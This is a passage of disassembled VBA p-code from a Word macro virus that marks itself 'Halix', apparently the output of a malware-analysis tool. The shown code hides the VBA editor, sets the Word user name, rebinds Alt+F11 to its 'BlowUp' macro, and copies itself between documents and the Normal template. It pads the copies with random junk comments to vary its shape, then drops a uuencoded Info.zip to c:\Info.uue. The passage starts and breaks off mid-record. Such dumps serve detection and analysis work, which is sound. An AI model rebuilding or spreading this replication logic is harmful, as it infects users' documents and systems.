' 	LitDI2 0x0000 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #42:
' 	QuoteRem 0x0000 0x0008 "Kfhn3Lso"
' Line #43:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #44:
' 	LitStr 0x0005 "Halix"
' 	MemStWith UserName 
' Line #45:
' 	LitStr 0x0003 "HAL"
' 	MemStWith UserInitials 
' Line #46:
' 	LitStr 0x0016 "Abajo Fidel Castro Ruz"
' 	MemStWith UserAddress 
' Line #47:
' 	QuoteRem 0x0000 0x0052 "S['c8$9|>]BB>33HZ6aXY&#-6EW:pvRD7.]~=6t+VYZbq(En9`EoHp4ev4~|sQ^K.]ZqB$P$CJ;| ^ZR!"
' Line #48:
' 	EndWith 
' Line #49:
' 	QuoteRem 0x0000 0x000B "GoTo NoBind"
' Line #50:
' 	QuoteRem 0x0000 0x002C "B>A5Xc9VVy7miF\NO+}0Xa)^fjH'OV$G*-=Y9GL%KI"
' Line #51:
' 	QuoteRem 0x0000 0x002A "/P@PE8%]BStHXC$)--h8,#bpQl~Q%[>:aED2s-EZTe"
' Line #52:
' 	SetStmt 
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	Set miTecla 
' Line #53:
' 	Ld wdKeyCategoryMacro 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0006 "BlowUp"
' 	ParamNamed Command 
' 	Ld miTecla 
' 	ArgsMemCall Rebind 0x0002 
' Line #54:
' 	Label NoBind 
' Line #55:
' 	QuoteRem 0x0000 0x0089 "<4{1GB>~WR,v"kd6zLeE5YTK]i%.(#S{4@uM5q%+|on6_[}G$t.7YBRxT|iFhVJ#"BGB\0I.}9$mc7ks~9KwxOtVGneu-j_wojjLfU.=LusD|O~Jj<&tWrmix#o59$v~8S@32+YW"
' Line #56:
' 	QuoteRem 0x0000 0x000E "2\K:o<}EkmYAW_"
' Line #57:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #58:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #59:
' 	QuoteRem 0x0000 0x000A "-=IHr$v6$j"
' Line #60:
' 	Ld MacroContainer 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0006 "'Halix"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo WorkNormal 
' 	EndIf 
' Line #62:
' 	ElseBlock 
' Line #63:
' 	QuoteRem 0x0000 0x0020 "4P[Y(zD@"uNFy7T#mLSC-f43>Hf*InVi"
' Line #64:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0006 "'Halix"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo Document 
' 	EndIf 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	GoTo Activar 
' Line #67:
' 	Label Document 
' Line #68:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St InfStr 
' Line #69:
' 	Ld InfStr 
' 	LitDI2 0x0002 
' 	Ld InfStr 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St Inf 
' Line #70:
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lin 
' Line #71:
' 	QuoteRem 0x0000 0x0038 "n.O"gp;GP_}(j#|aa0/|bt+-9">v6bo'nm2)[&[Kz1;Y6=({fHKKr"
' Line #72:
' 	LitDI2 0x0001 
' 	Ld lin 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #73:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "'Halix"
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #74:
' 	LitDI2 0x0002 
' 	LitStr 0x0001 "'"
' 	Ld Inf 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #75:
' 	QuoteRem 0x0000 0x007A "?GbNo?-vPkZ@|B<4ju*v[uh>Sn-kHS%$p~ ^{*DNv/o^4#wN`% {3uJ/:gq7@srGX1z8 >YC]fc0$62}0^w97ihD.V*9r_LU5 7{$q&d9w$YOsJoo%WPkH},`"
' Line #76:
' 	LitDI2 0x0003 
' 	St lin 
' Line #77:
' 	QuoteRem 0x0000 0x007F "/_9sfE(Z)`='\TWpy3-dm>qjDWBQMWj>8r8..60Q|E;`5b>#z9`CBKd7sjL+26 >d:=->Mx"i&\ajFh/y>%<^.t.IxL~Hid2/_~jVD9i6bZ1|n_%L(_jKRZr=:ZB"
' Line #78:
' 	LitDI2 0x0003 
' 	St slin 
' Line #79:
' 	Ld slin 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Le 
' 	DoWhile 
' Line #80:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0003 
' 	Eq 
' 	St decn 
' Line #81:
' 	QuoteRem 0x0000 0x0073 "z-<e7{{qv1x*keyKw/OCY"@e&6%p2j}lMa9&?6I?]HpLJ[`"T$Z/NJ~Yg:vq>rP3tN~!}q:2Ia:|0^#s$NL)(B$|V[gDV._3XqT|C[,fdsn_9JX&"
' Line #82:
' 	Ld decn 
' 	IfBlock 
' Line #83:
' 	QuoteRem 0x0000 0x0027 "tW2r3<#J?[Cyf%@DV7yG:xcyM>l%(c4Bi4?:N|_"
' Line #84:
' 	QuoteRem 0x0000 0x0047 ">sX?T!tJU.1Y%yuq{DpDJpn[F,_+<X@`T:3IIB~?A};85_QyJW=0'mLJ@#|X9L?pct3)L"
' Line #85:
' 	LitStr 0x0001 "'"
' 	St codigo 
' Line #86:
' 	LitDI2 0x0093 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0002 
' 	Add 
' 	FnInt 
' 	St a 
' Line #87:
' 	QuoteRem 0x0000 0x0066 "j$5X~j0Y^yPRDNnv[|-uzD}FaVCNg`Q]u?KvQL1U5Pg$TJQ7]?\o?8*mAW7Eu>4&<z"y14Z1\O6*`-/!04N^eL>eL1j0.[5oM)dn"
' Line #88:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #89:
' 	QuoteRem 0x0000 0x0079 "5uo,''64&YO;Y K'SWwN6?JxIi*5l&4#5EcXuk\f}9=X{zd?*P':@xr3&Bi|]M96eg.c-9M<t`^q?@ronpdOD](5i%C"cNdJFljVC'UIB\YRb%=`eo]%_w|\"
' Line #90:
' 	QuoteRem 0x0000 0x0025 "ZOPB?<JpB(^^kI#JkUPpQsB-*d+5'HB\pV|}U"
' Line #91:
' 	Ld codigo 
' 	LitDI2 0x0061 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x001F 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St codigo 
' Line #92:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #93:
' 	LitVarSpecial (True)
' 	St Iready 
' Line #94:
' 	ElseBlock 
' Line #95:
' 	QuoteRem 0x0000 0x0038 "S-nKkL&5!9CRo%ba6LjouJ7@ir/G=/^hQqx`{09r|f$?6"(h`w+w_j"
' Line #96:
' 	Ld slin 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St codigo 
' Line #97:
' 	LitVarSpecial (True)
' 	St Iready 
' Line #98:
' 	Ld codigo 
' 	LitStr 0x000C "Sub BlowUp()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0015 "Private Sub BlowUpH()"
' 	St codigo 
' 	EndIf 
' Line #99:
' 	QuoteRem 0x0000 0x0057 "unbW$*ZS5f_~D mjR79(_l$g{Kk^0-m[PiLB@?hh[F(B3aF2ZzLh|+N5/jw(I^Qnv\gvZp8,j$n+*@:$_yaaDA"
' Line #100:
' 	Ld codigo 
' 	LitStr 0x000C "'GoTo NoBind"
' 	Eq 
' 	IfBlock 
' Line #101:
' 	QuoteRem 0x0000 0x0090 "]ze:'cL205jy;4'MM= 9Wr* OxhsoREn^5|?_n]6GCfs~Q|KgznhL-A}]M&q#E2*X}$&F`lT+BE|QXmi9%G&)KkV&GUZ/lb[*4vlLnBv{6`L!{"0cbfQ]=oZLf(HB68-sGi if%V!K`a+#N"
' Line #102:
' 	QuoteRem 0x0000 0x0064 "A57trLNZYj:>JR>O:1%>qZh`r]^7MyZ+r"lA)ecDUI9=g7$[/6RhK3>$&$x#} ?3N^,wE/'u6RR/l$'oi?].~>&vsYa|6$wq0"
' Line #103:
' 	LitStr 0x000B "GoTo NoBind"
' 	St codigo 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	Ld codigo 
' 	LitDI2 0x0001 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Iready 
' 	EndIf 
' Line #106:
' 	QuoteRem 0x0000 0x0086 "5NsJ5s)AJZyvu.sa'<R\c;;F@\^EL=hyV+8t^@D@{[:dr(Wy*m4=?QdU`SgGG[t.%6M0j'?d,A[iHC2CuG'~Kf:4[|djS]XaM%odHAr*{l_SHG8?izZ{(]e6W?J~}ZS-C{/"
' Line #107:
' 	Ld slin 
' 	LitDI2 0x0001 
' 	Add 
' 	St slin 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	Ld Iready 
' 	If 
' 	BoSImplicit 
' 	Ld lin 
' 	Ld codigo 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' 	EndIf 
' Line #110:
' 	QuoteRem 0x0000 0x002A "s'Cpt0x{Y*(i@P?%\? jM+qouIR6\QWH8;UmATHY&D"
' Line #111:
' 	Ld lin 
' 	LitDI2 0x0001 
' 	Add 
' 	St lin 
' Line #112:
' 	QuoteRem 0x0000 0x0085 "{_%\@x3csC'_IS/z?{yt'8N}h^DG?J_pL"5CDHp-Nm=%v;wGgHgBi"74A{\t31dL25tCNWEE~]s6vi%0fWw!?XeA?|jvh^"A{c22dox\7Arnhz"c#D9>xSA&s?A3AR'>@j"
' Line #113:
' 	QuoteRem 0x0000 0x0033 "yD5:moxF&DIM3.qDD33zz%;0FBfAH7}zSF8$Ot~]dRGI?y\ha"
' Line #114:
' 	Loop 
' Line #115:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #116:
' 	QuoteRem 0x0000 0x001F "$EWX8lNeV&B8gIp?33=s"e"+3WTW.&;"
' Line #117:
' 	QuoteRem 0x0000 0x004C "uPU(%Ex72LQ:v4y9N ,(z4*\)W^B.wG&<y<ucGTe\ow@wmeuY[~.%JeW)`0g:#\J`[q)#]p_"
' Line #118:
' 	GoTo Activar 
' Line #119:
' 	Label WorkNormal 
' Line #120:
' Line #121:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St InfStr 
' Line #122:
' 	QuoteRem 0x0000 0x0080 ")_h-+/q=Y+"o)_PDaMf}F,V;4ViE%saU+60LJ@tUkg[a^g*~]?z%#Md@\_Wfh[tOcD,E2N5*>VspR%929,E1UsXd}~QBuoIN+U4R-<gs[_Ww.BnE>78yKm+Rv"#0y0"
' Line #123:
' 	Ld InfStr 
' 	LitDI2 0x0002 
' 	Ld InfStr 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St Inf 
' Line #124:
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lin 
' Line #125:
' 	LitDI2 0x0001 
' 	Ld lin 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #126:
' 	QuoteRem 0x0000 0x004D "6&zx0ySn[NQ0zZ(tjSB5T|#XNARC]U*7CYTTzih"D{und2YS9XOtB74-f7XnVNyz(MK*U?HuGM's"
' Line #127:
' 	QuoteRem 0x0000 0x0091 "p({~hg'W3{|cu kO{d5jR MlDyU<t_xg2 9pi}[=~`aw/OA_fL]Kbv`a>9!E*FBJm2)n? fz'Uv?UKSaTr$;R^dMkbBE[a8Flm)FDO~6c<M4\1%}(xiOrj UQRn1j\-S|_V}k"-EB}SnN`"
' Line #128:
' 	LitDI2 0x0001 
' 	St lin 
' Line #129:
' 	Ld lin 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Le 
' 	DoWhile 
' Line #130:
' 	QuoteRem 0x0000 0x0030 "K3(}{ZP$tK797[8!rL~@`v7!F\R=`A~=) B:)UA]2{D3mRe"
' Line #131:
' 	QuoteRem 0x0000 0x006F "BfA$3+Y0G iS"5&{|5!W\R-;%TC|4ld4g9D.x OyH8jA_=UIEM8}5hLub! P< m)nn]+K#fbFMqENzU8-It%[W'qD0h\x1,MXlfguo&YtGsl"
' Line #132:
' 	QuoteRem 0x0000 0x0081 "8]PlL@dQULCeXb~>ttQYX=g\Z0ZtVE{,2WL[u?xCViUyb4s0`BNQDAG5KM.*f#R!(y2>V^xgjq'4h T1yFn7F<GuLFP^@WoE5kmwV<ziS-K<nm3&\1lAn|z6;5?g~m|"
' Line #133:
' 	QuoteRem 0x0000 0x006C "nu;39&A@+{^{Ofeq_C^nm$X>N\7EMB52" PxHD o`}SYU|uuyC8.2Wuk&|y?]t[2Tt\C[,hWQ.iTphV]?4W]JkEr%B]JSI.~}<@;aRqQ![G"
' Line #134:
' 	Ld lin 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St codigo 
' Line #135:
' 	Ld codigo 
' 	LitStr 0x0015 "Private Sub BlowUpH()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "Sub BlowUp()"
' 	St codigo 
' 	EndIf 
' Line #136:
' 	Ld codigo 
' 	LitStr 0x000B "GoTo NoBind"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "'GoTo NoBind"
' 	St codigo 
' 	EndIf 
' Line #137:
' 	Ld lin 
' 	Ld codigo 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #138:
' 	Ld lin 
' 	LitDI2 0x0001 
' 	Add 
' 	St lin 
' Line #139:
' 	Loop 
' Line #140:
' 	QuoteRem 0x0000 0x0058 "WEc}7/D4x,cnaJ>^KVnej7'2dXt_&LZ]s/N@ 9mb8oR\Hb*To3[, &@aPa^vYH]UBa&hC@RYyyuAHT#(mh_to"
' Line #141:
' 	QuoteRem 0x0000 0x000A "nw2T~\T-MU"
' Line #142:
' 	QuoteRem 0x0000 0x003B "e1'O'8[m_:SAE7DkCc,RI{C+|\hyLc{R7D",-u5d0aG` ?6.~I2b=p'a&"
' Line #143:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #144:
' 	Label Activar 
' Line #145:
' 	QuoteRem 0x0000 0x000E "5J7.Gv*-y/,wQ&"
' Line #146:
' 	QuoteRem 0x0000 0x0082 "c_AhR5jlGKqVD+3=xTdlc`0(zjZk50vd:j+7>y!biPn$5.fo4J7>u@0|yO(?fYO7w\.*Elo15A/F+AH(sxVL_#sao@u1pxS<Y`Py^v$Aq*=-%<P14%/Zz2+x`3^u"
' Line #147:
' 	LitStr 0x000B "c:\Info.uue"
' 	Ld vbNormal 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #148:
' 	LitStr 0x000B "c:\Info.uue"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "_=_ "
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "_=_ Part 001 of 001 of file Info.zip"
' 	PrintItemNL 
' Line #152:
' 	QuoteRem 0x0000 0x0066 "Z6jm!tN%@ujK[y7MK$>6Q~BvL\37{qr^{KE-ER3t{rJb+if%U()3_L2OCre';92moo=XhKU)Szr/k42k.[bRVfXDZ%JQ<xEB}Ugk"
' Line #153:
' 	QuoteRem 0x0000 0x0064 "zM}_kg"0DjibtEk5jMU,Vkm)g0"J~~BVWW[j/Ec;az$NS9ZI)Xl]F/v($KYPMOsp@S~$>|s.}FcJ{+e!Sc=V5s=Al`ZOGuP.[1!"
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "_=_ "
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #156:
' 	QuoteRem 0x0000 0x0017 "Js)Rhj#{'7KI^cxu)4|4{E["
' Line #157:
' 	QuoteRem 0x0000 0x0015 "F2Y~>;+@c`yIP9!koJ=f"
' Line #158:
' 	QuoteRem 0x0000 0x0023 "#WF<Je2P>k,RxZlCC]kJAJDl%3][%%dhqD"
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "begin 666 Info.zip"
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M4$L#!!0``@`(`(,1`BN/U0L5[@D```X6```(````26YF;RYH=&V%6&N/&[<5"
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "M_5Z@_X%0`2,%Y'4;(&@0/X#U>ETOLJ]ZY:`M_(4S0TDT.*1"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "SB@K__J><TG."
' 	Add 
' 	PrintItemNL 
' Line #162:
' 	QuoteRem 0x0000 0x004B "OBr#]m'p!V:%0w4b6-KB@e9R0FutksvxaEx-xuo?UWVw_~L.9=6ll^f!4Dp"OuOiAE'~*-xI""
' Line #163:
' 	QuoteRem 0x0000 0x001D "N]zxkQ8D@2E_hIKIjV`*!>8) `UMI"
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "M2-NX#>"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0035 "L-)JYO*]S[KGSZL/JYOK-'__PZL/E^3O^O;E<G:L/J]7]\\M_?+KZ"
' 	Add 
' 	PrintItemNL 
' Line #165:
' 	QuoteRem 0x0000 0x006D "TWKBD#+-{t7."U`a>;u#KP]p0<eNk#&s9)x8t:d0Hy0jp?:i:&*D;V2^3{~if(\lv e0:Qt+vei8A#=7B1H!|w"0u5| j]hca5:PD!O>"
' Line #166:
' 	QuoteRem 0x0000 0x0060 "XHU39N;LBsM1[(&mn_2;&$=Jm/]dOngP!feZr'HS7\pBk4hn)MZXzgcxF;PGKkA-b}=}D]?)cn\y86@,t!F|V]brq-G84Vh"
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "MY?7B(OC!^.'YZK`S"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002B "W5Q=[NZO%V]7@SF<7BQ'7KW4K5;'9,97O]F?1=^2\__"
' 	Add 
' 	PrintItemNL 
' Line #168:
' 	QuoteRem 0x0000 0x0065 "h!)sL4iJ@}V!swP5Jqv`UI^-,wo'46@6pG$`+"{yi-fNY<SPPw|fWkBcK!<5#E(?m7|Vdm_`)kToMN:Dlmf"'O4.6axN*\[!qg])"
' Line #169:
' 	QuoteRem 0x0000 0x0009 "rPh(oWuyq"
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M^OT/WR]H:W6UNKY\\\[XT;=6*^W4)C361!]49]3%V.A7+_(]]>#;\YO+UXN5"
' 	PrintItemNL 
' Line #171:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "MZ7=.#\?'7?ST^3Z&3=2]>F^=29]O;!M#"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001B "NM!W:W7MC6?RQ^Z=-:%01QX4:-Z"
' 	Add 
' 	PrintItemNL 
' Line #172:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M>_?N7VIU^4]8^M-?Y+^%NKZZ_;E\7:\7ZI?R_4=\_Q$_O_W[Q=WUW4=<6<M_"
' 	PrintItemNL 
' Line #173:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "M-`A+[^&1>KCZ]^7KOZGY!K'XYM7]_PGV7IRB"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 "=Y[.YHTQ*!VHVG<=)<R26W#"
' 	Add 
' 	PrintItemNL 
' Line #174:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "M01FONF=6M^-@7FHUF!AMXTR/4ABU'7OKG.Z"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 ".JA>NR'J`5_.5+&88"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "N:=HL/"
' 	Add 
' 	PrintItemNL 
' Line #175:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MN%-[_$WAQ)P^_K*W@;;2]/SL>3*J&:/3=`YF@AA?6YSX3.?'47+:QRW6KT/L"
' 	PrintItemNL 
' Line #176:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M=6N?A?(3CL'U7T<#][WI9[_.U*7G3X-Q9F_3_,225W?1^*01&CY'W=F@UJ/O"
' 	PrintItemNL 
' Line #177:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "M-$/7+B=@9^`E_#./K1L/!D[@K"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 "%T]`3_>H.G4O5HL'M\03XW\"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "*B,"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "DX"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "6VK"
' 	Add 
' 	PrintItemNL 
' Line #178:
' 	QuoteRem 0x0000 0x0070 "W7b2T[;]P' `"ti:s``x/C+1fm_:SG#kB,QcmQOaI-9W:830Q_}8Go0mT>0U9J.jD)L5(|1P7n{Ng8#,9WeO4pl~{@Hs067&dGb0FZQ_@taJ>/I"
' Line #179:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "MFQP:76P"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "SH"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0028 "!P`+X)XDX4Q]8TLWHD2[S%2E+0^`%E,VN$12<0OJ"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "DT:-#U,"
' 	Add 
' 	PrintItemNL 
' Line #180:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "M9O-LK'DPCE[5)(Q^3G"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0029 "C$\MH)!T=?FXC,JC/U'FKLROS17'3N-HO7CJG0\,X"
' 	Add 
' 	PrintItemNL 
' Line #181:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "ML[$1CB"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0035 "W@\X)TBJ-3&2RG7P_\/2-YO'9BCRBF4BTALY7]P$WJ5V(<ZUY6=+%"
' 	Add 
' 	PrintItemNL 
' Line #182:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "MH_!C-#3*2D1I*TN'>IOZ<'P:[S>QMTS*[P7BZ^_P`7$[VT3XU-,"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "0G^PQZEV"
' 	Add 
' 	PrintItemNL 
' Line #183:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "MK!/]8'54-W93(<2W\1O-7IMZJ8@.PRHW8VIU9*ZOX&3T9EA*`"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "7*8[<]XTWT"
' 	Add 
' 	PrintItemNL 
' Line #184:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "M,S=5+1U"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0018 "1YQV;YF_H-K02^WZ4<[/*=OI"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "JT$$VTH/ZMVM!*"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "1B(J>E(^)Q_B"
' 	Add 
' 	PrintItemNL 
' Line #185:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "M*WIUVYI4XM#T?__,U/L[Y/OFZO8*+'2@?TA([E_')`\3+($<&#/:Y^[B"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 ":H/"
' 	Add 
' 	PrintItemNL 
' Line #186:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "M;(ZP5-XB\%]'M"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0024 "[!S[&:`*;H@6P*Q9M*R`Q2-H.5;E&4Z&I1Z!"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "TG52I,$B"
' 	Add 
' 	PrintItemNL 
' Line #187:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M08+=D&QC'2/-H>'L*:[?@^4$PYRDSA2P5(3S,W(86LE_K8I0#@(2RQJTP>J!"
' 	PrintItemNL 
' Line #188:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "M2_3$2XJN85YX9#&6QKI,<A5CRFZ\SK"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001D "`[8)8Z9AC]B+GY0.DYOB-4;D<_U:W"
' 	Add 
' 	PrintItemNL 
' Line #189:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "MM4O`*&OK)UX)=#3LS1<[%%S!0J._"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0019 "/@.JI._G?4,<%W=;:VKP;&#-O"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 ";YJ4-"
' 	Add 
' 	PrintItemNL 
' Line #190:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "M#C7<I-M\O:M..HW(V,7^!!FU707J"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001E "_B48??,4!*#O$$XT#9E&TX#P#L$'FG"
